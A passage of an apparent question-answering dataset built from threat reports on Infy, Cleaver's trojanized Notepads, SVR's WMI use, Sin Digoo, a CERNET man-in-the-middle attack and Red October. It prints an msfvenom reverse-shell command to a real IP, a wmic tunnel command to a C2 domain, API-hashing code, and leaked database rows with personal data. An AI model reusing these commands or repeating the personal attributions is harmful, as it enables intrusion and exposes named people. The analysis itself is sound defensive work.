malware across all examples. Only the offset varies: older versions encode just the C2 data, newer versions encode most strings, and some double-encode the C2 data with two different offsets. The following script can be used to decode these strings:\nBased on this specific encoding technique and key, we have identified related Infy samples from as early as mid 2007 (Figure 7), although more frequent related activity is observed after 2011. Historic registration of the C2 domain associated with the oldest sample that we found, fastupdate[.]net, suggests that it may have been associated with malicious activity as far back as December 2004.\nOver the years, we notice continued development and feature improvement in the code. For instance, support for the new Microsoft Edge browser was recently introduced in \"version 30\".\nMost of the associated malware samples dating back over the last five years were eventually detected by antivirus programs, but in most cases with a generic signature. Other examples are named with multiple unrelated signature classifications, including Win32/Tuax.A (very old versions), W32/ADOKOOB, Win32/Cloptern.A & B (old versions), TR/Graftor.106254, TR/Spy.Arpnatis.A, and Win32/Skeeyah.A!bit.\nWe refer to the malware as \"Infy\" because the actor used this string in multiple locations, including filenames (\"infy74f1.exe\" \u2013 Infy version 7.4 F1), C2 strings (\"subject=INFY M 7.8\"), and C2 folder names.\nBig Headline: Attribution\nThe Gmail account sending the emails in the attack that we first observed (Figure 8), belongs to an Israeli victim. That account was itself victim of an e-mail-borne attack that compromised the user's system and e-mail account.\nAmong WHOIS records for first-party domains used in the C2 infrastructure, we find three email accounts bearing a strong similarity in naming pattern:\nThe WHOIS records with the first two email addresses (and other C2 domains) have apparently fake WHOIS content. The \"aminjalali_58 (at) yahoo.com\" email address is associated with 6 known C2 domains, dating back to 2010. Unlike the fake WHOIS examples, this example has content more consistent with the email address:\namin jalali safehostonline afriqa street number 68 tehran\nTehran\n19699\nIR\n+98.935354252\naminjalali_58 (at) yahoo.com\nThe name \"Amin Jalali\" is not unique, though it does appear to have Iranian-specific origins. We find profiles and artifacts combining the name and \"58\", which may (or may not) be the same individual, and all of which have Iranian links.\nWhen we look at domains on neighboring IP addresses from known first-party C2s, we observe numerous Iranian domains, suggesting possibly an Iranian hosting reseller \u2013 and in at least one case, a free Iranian web host (Figure 9).\nBig Headline: Conclusion\nWe have enough evidence to conclude a pattern of behavior following extensive analysis of this malware and C2 infrastructure between these samples. The activity has been observed over almost 10 years, with the malware being constantly improved and developed. The low-volume of activity, deliberate campaign focus and content tailoring, and nature of targets hints at the goals of this actor.\nWe believe that we have uncovered a decade-long operation that has successfully stayed under the radar for most of its existence as targeted espionage originating from Iran. It is aimed at governments and businesses of multiple nations as well as its own citizens.\nPalo Alto Networks customers are protected from this threat in the following ways:\n1. WildFire accurately identifies all malware samples related to this operation as malicious.\n2. Domains used by this operation have been flagged as malicious in Threat Prevention.\n3. AutoFocus users can view malware related to this attack using the \"Infy tag.\nIOCs can be found in the appendices of this report.\nSpecial thanks to Michael Scott for assistance with Maltego in this investigation.\n\nQuestion: How does the Infy malware use encryption and obfuscation techniques to evade detection, and what specific key is used for encoding strings within the malware?\n\nAnswer:",
    "output": "The Infy malware uses encryption and obfuscation techniques to avoid detection. One of the SFX layers is encrypted with the key '1qaz2wsx3edc'. The package typically includes a fake readme.txt file and sometimes image or video files for camouflage. The executable has a filename pattern ins[*].exe, and the main payload is a DLL file with a filename pattern mpro[*].dll. The malware encodes strings using a specific key, with variations in offsets depending on the version. Older versions encode just the C2 data, while newer versions encode most strings, sometimes double-encoding the C2 data with two different offsets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Tales from the Code\nLet's take a look at the entry point code of the malicious Notepads and see if it aligns with our observations. The short answer is, it looks like nonsense. Here's a snippet from Notepad4.exe:\nAt this point the code becomes difficult to list due to instruction scission, or branching into the middle of an instruction (analogous to a frameshift error in DNA translation, if that helps). For instance, the JNP instruction at 010067FF is a two-byte instruction, and the JNZ branch at 010067F9, if satisfied, jumps to the JNP instruction's second byte at 01006800. That byte begins a different two-byte instruction, which incorporates what would have otherwise been the first byte of the instruction after the JNP, meaning its successor will start in the middle of JNP's successor, and so on. The two execution paths usually (but don't\nnecessarily) converge after a few instructions.\nThe outcome of these instructions depends on the initial state of the registers, which is technically undefined. Seeing code operate on undefined values typically suggests that the bytes aren't code after all and so shouldn't have been disassembled. But keep looking. Notice that there are no memory accesses (which could raise an access violation), no stack pointer manipulation (which could cause a stack overflow or underflow), no division instructions (which could raise a divide exception), no invalid or privileged instructions, no interrupts or indirect branches--really, no uncontrolled execution transfers of any kind. Even more tellingly, all the possible execution paths seem to eventually flow to this code:\nHere the gaps in the listing indicate when the disassembly follows an unconditional branch. The code seems to abruptly change character after the jump at 01006891, transitioning from gibberish to a string of short sequences connected by unconditional branches. This transition corresponds to a jump from the end of the short run of modifications (01006896) after the malware entry point to the beginning of the longer run of modifications (01005747) a few kilobytes before it. (See the third column in Figure 3.)\nIn the disassembly above, the first sequence of green lines is a clear CALL-POP pair intended to obtain a code address in a position-independent way. (An immediate address value marked with a relocation would be the orthodox way to obtain a code pointer, but preparing that would have involved modifying the \".reloc\" section.) No way is this construct a coincidence. Furthermore, the blue lines strongly resemble the setup for a VirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of green lines invoke the CALL-POPped function pointer with what one might readily assume is a hash of the string \"VirtualAlloc\". (It is.)\nThere's plenty more to observe in the disassembly, but, let's fast-forward past it.\nwindbg -c \"bp kernel32!VirtualAlloc ; g\" Notepad4.exe...\ng poi(@esp) ; ba w 1 @eax+@esi-1 ; g...\nAnd now we can dump the extracted code from memory. It isn't immediately gratifying:\nThe byte 0xD6 at address 00100019 doesn't disassemble, and there aren't any branches skipping over it. But check out the instructions just above it referencing \"[eax+19]\". The code is in a sense self-modifying, flowing right into a portion of itself that it XOR decodes. The first decoded instruction is \"LOOP 00100010\" (0xD6 ^ 0x34 = 0xE2, the opcode for LOOP), which will execute the XOR loop body 99 more times (CL - 1 = 0x63 = 99) and then fall through to the newly-decoded code.\nWhen we run this decoding stub (which, come to find out, is Metasploit's \"shikata ga nai\" decoder stub) to\nHere, the first byte to be XORed is the second byte of the LOOP instruction, hence the nonsensical destination apparent in the pre-decoding disassembly above. (For brevity, we cut each listing at the first sign of encoding.) Run that to completion, and then...\n>InMemoryOrderModuleList\n; PLDR_MODULE.BaseDllName.Buffer\nIt looks like a call over a typical module or export lookup function. In fact, it is, and as the ROR-ADD pair suggests, it implements module name and export name hashing, the algorithms of which can be expressed\nas follows:\nunsigned int GetModuleNameHash(PLDR_MODULE pLdrModule)\n{\nunsigned int hash = 0;\nchar * p = (char *) pLdrModule->BaseDllName->Buffer;\nfor (int n = pLdrModule->BaseDllName->MaximumLength; n != 0; p++, n--)\n{\nchar ch = *p;\nif (ch >= 'a') ch -= 0x20;\nhash = _rotr(hash, 13) + (unsigned char) ch;\n}\nreturn hash;\n}\nunsigned int GetExportNameHash(char *pszName)\n{\nunsigned int hash = 0;\nfor ( ; ; pszName++)\n{\nhash = _rotr(hash, 13) + (unsigned char) *pszName;\nif (*pszName == 0) break;\n}\nreturn hash;\n}\nStill, this is all just preamble. What is the point that it eventually gets to?\nYou'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means there's some treasure beyond all fables at the bottom of this erstwhile Notepad. Sorry. It just downloads and executes a block of raw code. (Spoiler: it's actually a Metasploit reverse connect stager.) Here is its behavior summarized as function calls:\nkernel32!LoadLibraryA(\"ws2_32\")\nws2_32!WSAStartup(...)\ns = ws2_32!WSASocketA(AF_INET, SOCK_STREAM, ...)\nws2_32!connect(s, { sin_family = AF_INET, sin_port = htons(12345), sin_addr = 108.175.152.230 }, 0x10)\nws2_32!recv(s, &cb, 4, 0)\np = kernel32!VirtualAlloc(NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\nws2_32!recv(s, p, cb, 0)\np()\nThe above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe. NOTEPAD2.EXE doesn't seem to want to run, for reasons we didn't bother to troubleshoot for the bad guys.\nBig Headline: Denouement\nUnfortunately, we never did obtain a sample of the code that might have been downloaded. The key to that enigma-embedded, mystery-wrapped riddle is forever lost to us. The best we can do is read what's written in the Notepads and speculate as to why they exist at all.\nClearly whatever generator created these Notepads is far, far beyond the technical understanding of the Cleaver team. It stands to reason that there is a generator--no chance these were crafted by hand--and that its sophistication is even greater than that of its output. Something like that wouldn't be used only once. Something like that, if this team was able to get ahold of it, must be out there. Turn the right corner of the internet, and you can find anything...\nWell it so happens that we did eventually find it. Some of you have no doubt suspected it all along, and\nnow I'll humbly confirm it for you: the Notepads were, in their entirety, generated by Metasploit. Something along the lines of \"msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe\". The \"msfvenom\" tool transmogrifies a Metasploit payload into a standalone EXE, and with the \"-x\" switch, it'll fuse the payload--encoded as desired--into a copy of an existing executable, exhibiting exactly the behavior we just described. Omne ignotum pro magnifico. Perhaps the more bizarre a thing is, the less mysterious it proves to be.\nHowever, we're still left to wonder what Cleaver was up to when they generated all those Notepads. One conclusion Brian proposed is that they're intended as backdoors--replacements for the legitimate Notepad on a compromised system--which would enable Cleaver to regain access to a system at some indeterminate time in the future, the next time a user runs Notepad. The team demonstrated a similarly intentioned tactic with a connect-back shell scheduled to run in a six-minute window each night; the Notepad replacement, while more intrusive, could be another example of this contingency planning tendency.\nOr maybe the Notepads were only an aborted experiment, attempted and shelved, forgotten in a flurry of compromises and criminal activity. If nothing else, they made for an unexpected bit of mystery.\nQ: What techniques are used in the malicious Notepads to achieve position-independent code execution and how do these techniques work?",
    "output": "The malicious Notepads use a CALL-POP pair to obtain a code address in a position-independent way. This technique involves calling a function and then popping the return address off the stack, which gives the current instruction pointer. This is done instead of using an immediate address value marked with a relocation, which would require modifying the '.reloc' section. Additionally, the code includes a setup for a VirtualAlloc call, which allocates memory with execute permissions, and invokes a function pointer with a hash of the string 'VirtualAlloc'. These techniques allow the code to execute without relying on fixed memory addresses, making it more resilient to changes in the memory layout.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Russian Foreign Intelligence Service (SVR) utilize Windows Management Instrumentation (WMI) in their attack campaigns, specifically in regards to executing malicious tools like Rsockstun?",
    "output": "Windows Management Instrumentation (WMI) is a powerful administration feature in Windows systems that provides a uniform environment to access system components. It allows for both local and remote access, making it a valuable tool for attackers. In the case of the Russian Foreign Intelligence Service (SVR), they have been observed using WMI to execute malicious tools like Rsockstun. Specifically, the SVR used the Windows Management Instrumentation Command Line (WMIC) utility to execute Rsockstun in memory or after dropping it to disk. This was done using the command `wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"`. By leveraging WMI, the SVR was able to establish a tunnel to their Command and Control (C2) infrastructure, allowing them to further compromise the targeted environment. This highlights the importance of monitoring WMI activity and ensuring that it is properly secured to prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Link to RSA breach\nIn addition to the GhostNet link, connections can also be drawn between the malware used in the Sin Digoo activity and the (<http://www.rsa.com/node.aspx?id=3872>)RSA breach revealed in early 2011. According to the (<http://www.occ.treas.gov/news-issuances/alerts/2011/alert-2011-4.html>)US-CERT EWIN-11-077 bulletin, a number of command-and-control (C2) hostnames used by RegSubs-Dat shared three different IP addresses at different points in time, with one of the hostnames known to be part of the RSA breach. This C2 hostname was used in a piece of malware known as \"Murcy\", which was detailed in \"(<http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf>)Command and Control in the Fifth Domain,\" a 2012 report by Command Five Pty Ltd.\nAll three IP addresses belong to the China Beijing Province Network (AS4808). Although the RegSubsDat and Murcy C2s shared these IPs a few months apart, the fact that three IP different addresses at the same ISP overlapped in a short time frame seems to indicate shared infrastructure used by both the RSA breach actors and other actors using the RegSubsDat malware. AS4808 is known for many other connections to malware and is considered by some to be a hotbed of espionage C2s, especially the 123.120.96.0/19, 114.248.80.0/20 and 114.248.96.0/20 subnets. These subnets have been seen in DNS records for hundreds of C2 hostnames for dozens of custom malware families, either known for or\nsuspected in espionage activity.\nMedium Headline: Tracking Tawnya\nThe same type of open-source intelligence can be used to gather information about the jeno_1980@hotmail.com actor. One domain registered by jeno_1980@hotmail.com is \"socialup.net\". This site describes a \"like exchange,\" which is a service that Internet marketers can use to promote a story on social media sites like Digg or Reddit.\nThis type of service falls under the category of \"blackhat SEO,\" a term for a variety of techniques for manipulating search engines and social media sites for marketing purposes. These methods are considered \"blackhat\" because they usually lead to a site or user being banned from the search engine or social media sites if the manipulation is discovered.\nThe socialup.net website has been repeatedly promoted on blackhat SEO message boards by various personas, including one named \"Tawnya\".\nOnce a user signs up with socialup.net, they can earn virtual \"coins.\" The coins can be used to promote the user's websites or social media posts, either by viewing ads or liking other users' stories and links. A user can also buy coins from the owner of socialup.net using PayPal.\nAs part of the PayPal transaction, the potential customer can see the payee email address. In the case of socialup.net, PayPal's website shows that the payment for the socialup.net coins is sent to an individual with the initials jzd.\nOne of the other \"Tawnya Grilth\" domains is \"i-tobuy.com\". This domain was registered in 2004 using the jeno_1980@hotmail.com email address and \"Sin Digoo\" location, but the nickname \"xxgchappy\" is also shown in the registrant contact data.\nAnother domain registered in 2004 using the \"Sin Digoo\" location was \"1stsale.net\", registered to a \"john twk\" with the email address xxgchap-py@vip.sina.com.\nThere is a profile on a Chinese programmers' forum for an \"xxgchappy\" user who has posted two different email addresses in different messages on the site. These addresses are xxgchappy@vip.sina.com and @sina.com.cn (address redacted). The user's name is listed on the forum's profile page for \"xxgchappy\" and contains the initials ZD.\nSeveral clues on the Internet point to xxgchappy, or ZD, having a working knowledge of computer programming. The use of the programmers' forum, along with postings to that site, indicates he is interested in code related to hooking Windows API functions, a common technique used in malware. Additionally, both xxgchappy@vip.sina.com and king_public@hotmail.com were the listed email addresses for users of the \"rootkit.com\" site, revealed when that site's database was leaked in 2011.\nA \"rootkit\" is a program used for hiding traces of malware on a system, and rootkit.com was a forum for discussing the latest rootkit technolo-\ngies. However, simply having an account on rootkit.com does not imply one is using rootkits offensively \u2014 many anti-malware researchers were also members of the site. There are some interesting clues in the database table for both users.\nThe nickname \"Jeno\" appears again in the rookit.com user database entry for the user with the email address xxgchappy@vip.sina.com.\n(7523,'Jeno','91cec994','Jeno Alix','xxgchappy@vip.sina.com',1,0,\n'','','','','','',0,'http://www.rootkit.com/usericons/Jeno.jpg',''\n,1265784473,'123.6.89.98',0,0,0,1265721022,0,0,0,'','0','','','',-1,''),\n(23025,'king-rose','e211f11c0b28434bf7f1c8fb510fa9ae','Club-tom',\n'king_public@hotmail.com',1,1106582903,'','','','','','',0,'',''\n,1106837367,'61.51.59.63',0,0,0,1106583113,0,0,0,'BH','19800126',\n'','','',0,''),\nFigure 13. Database entries with the xxgchappy and king_public email addresses.\nIn the entry for king_public@hotmail.com, we see the nicknames \"king-rose\" and \"Club-tom\", but even more interesting is the password hash \"e211f11c0b28434bf7f1c8fb510fa9ae\". This password hash appears in only one other entry in the rootkit.com database:\n(20446,'king-z','e211f11c0b28434bf7f1c8fb510fa9ae','k,z,y',\n'wzy_100@hotmail.com',1,1097652186,'','','','','','',0,'','',1284013010,\n'123.120.127.153',0,0,0,1284013010,0,0,0,'','','','','',0,''),\nFigure 14. Other appearance of the password hash associated with king_public@hotmail.com.\nFrom this evidence, we can deduce that \"king-z\" is a second, earlier account of king_public@hotmail.com, created using the wzy_100@hotmail.com email address. Even more interesting is the 123.120.127.153 IP address the king-z account used to log in. This IP is located inside one of the AS4808 netblocks famous for espionage activity. In fact, it is remarkably close to 123.120.127.159, an IP used by Enfal C2 v2.windowsaupdate.net (one of the \"Tawnya Grilth\" domains) on September 27, 2010. The last account activity for king-z as shown in the rootkit.com database is September 9, 2010. This data strongly suggests that king_public@hotmail.com is not just a stolen account used to register a domain, but that the user is involved in the espionage network in some manner.\nThe password used by xxgchappy@vip.sina.com does not appear elsewhere in the leaked rootkit.com database; however, another leaked database may provide additional clues surrounding the xxgchappy personality.\nThe @sina.com.cn (address redacted) email address associated with the user xxgchappy can be found inside an archive posted to the \"hackchina.com\" website.\nxxgchappy # 2710 # @sina.com.cn\nFigure 15. xxgchappy reference from the hackchina.com website.\nThe archive contains a denial-of-service attack tool called \"lankiller\".  Inside the lankiller binary is the following comment:\nDesigned for lyh by xxgc-happy   2002.3.8\nFigure 16. Reference to xxgc-happy in the lankiller tool.\nAlso included in the lankiller archive is a README file that describes the use of the tool. It asks the user to email the author at either @sina.com.cn or happy@sohu.com.cn.\nThere is a profile for \"happy\" on a Chinese video site showing a possible photo of the user. The photo is of a man who appears to be in his early twenties and of Asian descent.\nMedium Headline: Conclusion\nThe Sin Digoo activity is only a limited view into a very large amount of espionage-by-malware that is happening in the world. The Enfal, RegSubsDat, and Murcy malware families possess dozens of defunct and active C2s, and these three trojans are only a tiny subset of the malware families the Dell SecureWorks CTU research team knows to be involved in espionage activity. Collaboration between government, espionage malware victims, and the computer security industry must improve to better defend against this undercurrent of activity that threatens to undermine an already weakened economy in countries around the world.\n\nHow did the investigation into the Sin Digoo affair reveal connections between the malware used and the RSA breach in 2011? Explain the significance of the shared IP addresses and the role of AS4808.",
    "output": "A: The investigation into the Sin Digoo affair revealed connections between the malware used and the RSA breach through shared command-and-control (C2) hostnames and IP addresses. According to the US-CERT EWIN-11-077 bulletin, a number of C2 hostnames used by RegSubs-Dat shared three different IP addresses at different points in time, with one of the hostnames known to be part of the RSA breach. This C2 hostname was used in a piece of malware known as 'Murcy'. All three IP addresses belonged to the China Beijing Province Network (AS4808), which is known for its connections to malware and is considered a hotbed of espionage C2s. The overlap of these IP addresses in a short time frame suggests shared infrastructure used by both the RSA breach actors and other actors using the RegSubsDat malware. The subnets within AS4808 have been seen in DNS records for hundreds of C2 hostnames for dozens of custom malware families, either known for or suspected in espionage activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Client and Server IP adresses\nThe analyzed capture files contain pure IPv6 traffic (CERNET is a IPv6 network) which made the analysis a bit different then usual. We do not disclose the client IP addresses for privacy reasons, but they both seem legit; one from Peking University (netname PKU6-CERNET2) and the other from Chongqing\nUniversity (CQU6-CERNET2). Both IP addresses belong to (<http://bgp.he.net/AS23910>)AS23910, named \"China Next Generation Internet CERNET2\".\nPeking University entrance, by galaygobi (Creative Commons Attribution 2.0)\nChongqing University gate, by Brooktse (Creative Commons Attribution-Share Alike 3.0)\nThe IP addresses received for www.google.com were in both cases also legit, so the MITM wasn't carried out through DNS spoofing. The Peking University client connected to 2607:f8b0:4007:804::1013\n((<http://whois.arin.net/rest/net/NET6-2607-F8B0-1/pft>)GOOGLE-IPV6 in United States) and the connection from Chongqing University went to 2404:6800:4005:805::1010 ((<http://wq.apnic.net/apnic-bin/whois.pl?searchtext=2404:6800::/32&object_type=inet6num>)GOOGLE_IPV6_AP-20080930 in Australia).\nBig Headline: Time-To-Live (TTL) Analysis\nThe Time-To-Live (TTL) values received in the IP packets from www.google.com were in both cases 248 or 249 (note: TTL is actually called \"Hop Limit\" in IPv6 nomenclature, but we prefer to use the well established term \"TTL\" anyway). The highest possible TTL value is 255, this means that the received packets haven't made more than 6 or 7 router hops before ending up at the client. However, the expected number of router hops between a server on GOOGLE-IPV6 and the client at Peking University is around 14. The low number of router hops is is a clear indication of an IP MITM taking place.\nHere is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University (generated with ARP Networks' (<http://4or6.com/traceroute?l=en>)4or6.com tool):\n#traceroute -6 2001:da8:[REDACTED]\n1 2607:f2f8:1600::1 (2607:f2f8:1600::1) 1.636 ms 1.573 ms 1.557 ms\n2 2001:504:13::1a (2001:504:13::1a) 40.381 ms 40.481 ms 40.565 ms\n3 * * *\n4 2001:252:0:302::1 (2001:252:0:302::1) 148.409 ms 148.501 ms 148.595 ms\n5 * * *\n6 2001:252:0:1::1 (2001:252:0:1::1) 148.273 ms 147.620 ms 147.596 ms\n7 pku-bj-v6.cernet2.net (2001:da8:1:1b::2) 147.574 ms 147.619 ms 147.420 ms\n8 2001:da8:1:50d::2 (2001:da8:1:50d::2) 148.582 ms 148.670 ms 148.979 ms\n9 cernet2.net (2001:da8:ac:ffff::2) 147.963 ms 147.956 ms 147.988 ms\n10 2001:da8:[REDACTED] 147.964 ms 148.035 ms 147.895 ms\n11 2001:da8:[REDACTED] 147.832 ms 147.881 ms 147.836 ms\n12 2001:da8:[REDACTED] 147.809 ms 147.707 ms 147.899 ms\nAs can be seen in the traceroute above, seven hops before the client we find the (<http://wq.apnic.net/apnic-bin/whois.pl?searchtext=2001:252::/32&object_type=inet6num>)2001:252::/32 network, which is called \"CNGI International Gateway Network (CNGIIGN)\". This network is actually part of CERNET, but on (<http://bgp.he.net/AS23911>)AS23911, which is the network that connects CERNET with its external peers. A reasonable assumption is therefore that the MITM is carried out on the 2001:252::/32 network, or where AS23910 (2001:da8:1::2) connects to AS23911 (2001:252:0:1::1). This means that the MITM attack is being conducted from within China.\nBig Headline: Response Time Analysis\nThe round-trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server. The expected round-trip time for connecting from CERNET to a Google server overseas would be around 150ms or more. However, in the captures we've analyzed the TCP SYN+ACK package was received in just 8ms (Peking) and 52ms (Chongqing) respectively. Again, this is a clear indication of an IP MITM taking place, since Google cannot possibly send a response from the US to CERNET within 8ms regardless of how fast they are. The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University.\nEven though the machine performing the MITM was very quick at performing the TCP tree-way handshake we noticed that the application layer communication was terribly slow. The specification for the TLS handshake ((<https://www.ietf.org/rfc/rfc2246.txt>)RFC 2246) defines that a ClientHello message should be responded to with a ServerHello. Google typically send their ServerHello response almost instantly, i.e. the response is received after one round-trip time (150ms in this case). However, in the analyzed captures we noticed ServerHello response times of around 500ms.\nBig Headline: X.509 Certificate analysis\nWe extracted the X.509 certificates from the two capture files to .cer files using (<http://networkminer.com/>)NetworkMiner. We noticed that both users received identical certificates, which were both self signed for \"google.com\". The\nfact that the MITM used a self signed certificate makes the attack easily detectable even for the nontechnical user, since the web browser will typically display a warning about the site not being trusted. Additionally the X.509 certificate was created for \"google.com\" rather than \"*.google.com\". This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to \"www.google.com\" but not to \"google.com\".\nNetworkMiner showing list of X.509 certificates extracted from the two PCAP files\nCertificate SHA1 fingerprint: f6beadb9bc02e0a152d71c318739cdecfc1c085d\nCertificate MD5 fingerprint: 66:D5:D5:6A:E9:28:51:7C:03:53:C5:E1:33:14:A8:3B\nA copy of the fake certificate is available on (<https://docs.google.com/file/d/0ByksGrIc0SXfT0p3NFpKWFlrMkE/edit>)Google drive thanks to GreatFire.org.\nBig Headline: Conclusions\nAll evidence indicates that a MITM attack is being conducted against traffic between China's nationwide education and research network CERNET and www.google.com. It looks as if the MITM is carried out on a network belonging to AS23911, which is the outer part of CERNET that peers with all external networks. This network is located in China, so we can conclude that the MITM was being done within the country.\nIt's difficult to say exactly how the MITM attack was carried out, but we can dismiss DNS spoofing as the used method. The evidence we've observed instead indicate that the MITM attack is performed either by performing (<http://en.wikipedia.org/wiki/IP_hijacking>)IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy. An alternative to changing the router config would also be to add an in-line device that redirects the desired traffic to the SSL proxy. However, regardless of how they did it the attacker would be\nable to decrypt and inspect the traffic going to Google.\nPosted by Erik Hjelmvik on Thursday, 04 September 2014 23:55:00 (UTC/GMT)\nQuestion: How does the analysis of the X.509 certificates provide evidence of a MITM attack, and what specific characteristics of the certificates support this conclusion?",
    "output": "Answer: The X.509 certificates extracted from the capture files were both self-signed for 'google.com', making the attack easily detectable even for non-technical users, as web browsers typically display warnings about untrusted sites. Additionally, the certificate was created for 'google.com' rather than '*.google.com'. This is a significant oversight by the attackers, as they were attempting to MITM traffic to 'www.google.com', not 'google.com'. The use of a self-signed certificate and the incorrect domain name in the certificate are clear indications of a MITM attack, as legitimate certificates issued by trusted certificate authorities would not exhibit these issues.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Infection and Propagation Vectors\nThe exploits used in the targeted attack are sent to the users through spear phishing e-mails that contain crafted malicious documents as attachments, and a malicious link embedded in the e-mail that leads to a compromised website.\nOnce the user opens the malicious document containing the embedded code, a malicious payload is dropped into the system. The dropped payload in turn communicates with the C&C servers. The payload receives additional modules from the C&C server to handle the infection on different types of devices and also could drop additional malware.\nMedium Headline: Description\nThere could be different combinations of Microsoft and Java exploits and payload in the wild to achieve this attack. We have used one of the MD5s (51EDEA56C1E83BCBC9F873168E2370AF) to do this analysis, which is a document file.\nThe Red October campaign is known to target the following mentioned vulnerabilities:\n\u2022 CVE-2012-0158 (MS Word)\n\u2022 CVE-2010-3333 (MS Word)\n\u2022 CVE-2009-3129 (MS Excel)\n\u2022 CVE-2011-3544 (Java Rhino Script Engine Vulnerability)\nThe following picture clearly shows how the targeted attack happens in the Red October Campaign.\nMedium Headline: Payload Information:\nAfter successful exploitation of the vulnerability, the embedded executable file (msmx21.exe) is dropped in the %temp% folder.\nmsmx21.exe creates and executes the following files:\n%Temp%\\msc.bat\n%ProgramFiles%\\Windows NT\\svchost.exe\n%ProgramFiles%\\Windows NT\\wsdktr.ltp (Encrypted payload) -> random name\nThe dropped batch file has the following content:\nThe use of \u2022chcp 1251\u2022 in the batch file is to switch the codepage of an infected system to handle Cyrillic characters. This might suggest that either the attack originates from Russia or was also targeted towards government agencies in Russia.\nSvchost.exe is an installer component that decrypts and loads the main backdoor (wsdktr.ltp). It connects to the following Microsoft hosts to check for a live Internet connection:\nupdate.microsoft.com     www.microsoft.com     support.microsoft.com\nwsdktr.ltp is an encrypted executable file (UPX packed dll) that is decrypted and loaded into memory by svchost.exe.\nMedium Headline: Exploitation Using Java (CVE-2011-3544):\nIn Java Rhino Script Engine Vulnerability, security manager is disabled during JavaScript execution, which would enable full permission to the system during its execution. When the user clicks the link that came through the spam mail, the exploit would be triggered on the vulnerable system.\nThe downloaded payload creates and executes the following files:\n%Temp%\\ tmp42e76b5f.bat -> random name\n%Application Data%\\Keucot\\ qagi.exe -> random name\n%Application Data%\\ Okurp \\ dezaa.ufy-> random name (encrypted content)\nThe batch file has the following content:\nThe payload injects itself to the running system processes in the machine. They also monitor the browser activities in the targeted browsers (Chrome, Firefox, Safari, and IE).\nThe above picture shows the changes made to the configuration file so that cookies won\u2022t be cleared when the user shuts down the system. Also warning messages won\u2022t be displayed when the user visits the malicious or insecure pages.\nMalicious threads injected to the processes monitor the user\u2022s activities and collect the information about the Outlook contacts and browser cookies, along with the system information. The collected information is stored as an encrypted content and sent to the command & control server. Some of these exploits download Ransomware and Zbot payloads.\nC&C Server:\n29f2aad01fee3663.com\nMcAfee has coverage for this exploit CVE-2011-3544 and detects the downloaded payload used in the targeted attack as BackDoor-FJJ.\nMedium Headline: Mitigation\nUsers are requested to exercise caution while opening unsolicited emails and unknown links. Users are advised to update Windows and third-party application security patches and virus definitions on a regular basis and have proper filtering rules.\n\u2022 Use Access Protection Rules from accessing such run keys.\n\u2022 Please keep your anti-virus updated.\n\u2022 Keep software up-to-date with the latest available patches.\n\u2022 It is advisable to use your firewall to monitor unusual traffic.\n\u2022 Disable AutoPlay to prevent the automatic launching of executable files on network and removable drives.\nBig Headline: Getting Help from the McAfee Foundstone Services team\nThis document is intended to provide a summary of current intelligence and best practices to ensure the highest level of protection from your McAfee security solution. The McAfee Foundstone Services team offers a full range of strategic and technical consulting services that can further help to ensure you identify security risk and build effective solutions to remediate security vulnerabilities.\nYou can reach them here: https://secure.mcafee.com/apps/services/services-contact.aspx\n\u00a9 2011 McAfee, Inc. All rights reserved.\n\nQuestion: What are the key components and functions of the payload dropped by the Red October campaign, and how do they facilitate the attack?\n\nAnswer:",
    "output": "The payload dropped by the Red October campaign includes several components: msmx21.exe, msc.bat, svchost.exe, and wsdktr.ltp (an encrypted payload). The msmx21.exe file drops these components into specific directories. The batch file msc.bat switches the codepage to handle Cyrillic characters, suggesting a potential Russian origin or target. Svchost.exe acts as an installer that decrypts and loads the main backdoor (wsdktr.ltp), which is a UPX packed DLL. This backdoor checks for an internet connection by pinging Microsoft hosts and facilitates communication with the C&C server, enabling further exploitation and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 2. Introduction\nThe geopolitical conflicts in the Middle East have deepened in the last few years; Syria is no exception. The crisis is taking many forms, and the cyberspace conflict is intensifying as sides try to tilt the struggle, by exploiting cyber intelligence and exercising distortion.\nIn the last few years cyber-attacks in Syria have moved into the front line; many activities in cyberspace have been linked to Syria, especially those conducted by the Syrian Electronic Army and pro-government groups.\nThe Global Research and Analysis Team (GReAT) at Kaspersky Lab has found new malware attacks in Syria, using new but not advanced techniques to hide and operate malware, in addition to using proficient social engineering tricks to deliver malware by tricking and tempting victims into opening and exploring malicious files. The malware files have been found on hacked activist sites, web pages and in social networking forums.\n\u0629\u064a\u0631\u062d\u0644\u0627 \u0644\u062c\u0644\u0623 \u0646\u0648\u064a\u0646\u0642\u062a\n, an Arabic-language digital security project of the IWPR (Institute for War and Peace Reporting), reported four of these samples in March 2014. The same samples were also reported , Technicians For Freedom): on Syrian Facebook pages (\nGiven the complexity of the situation, there are many factors and entities at play  in this event, but from the outside these are all largely speculative. Pro-government groups talk about \"defense\" and opposition activists talk about \"offense\". Here, we will only focus on the malware and the facts that have been found during the analysis, presenting only relevant information, in the hope of setting a clear context for this research.\nAnswer this question: How did the Syrian Electronic Army and pro-government groups leverage social engineering tactics to distribute malware in Syria, and what were the primary 